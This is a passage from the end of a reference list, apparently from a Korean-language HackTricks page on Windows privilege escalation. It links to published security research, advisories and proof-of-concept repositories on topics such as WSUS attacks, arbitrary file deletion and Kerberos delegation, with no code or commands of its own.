- [30] [모든 것을 지배하는 하나의 I/O Ring: Windows 11에서 완전한 읽기/쓰기 익스플로잇 프리미티브](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [임의 파일 삭제를 악용한 권한 상승과 그 밖의 유용한 기법](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs 익스플로잇 코드](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS 공격 2부: CVE-2020-1013, Windows 10 로컬 권한 상승 1-day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager와 Windows Vault 살펴보기](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - 이미지 변경이 권한 상승으로 이어지는 경우: Kerberos 리소스 기반 제한 위임](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent에서 SSH 개인 키 추출하기](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – 엔터프라이즈 업데이트 서버를 백도어 공장으로 바꾸기 (0_o) – 1부](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – 엔터프라이즈 업데이트 서버를 백도어 공장으로 바꾸기 (0_o) – 2부](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer 폴더 삭제를 통한 권한 상승](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
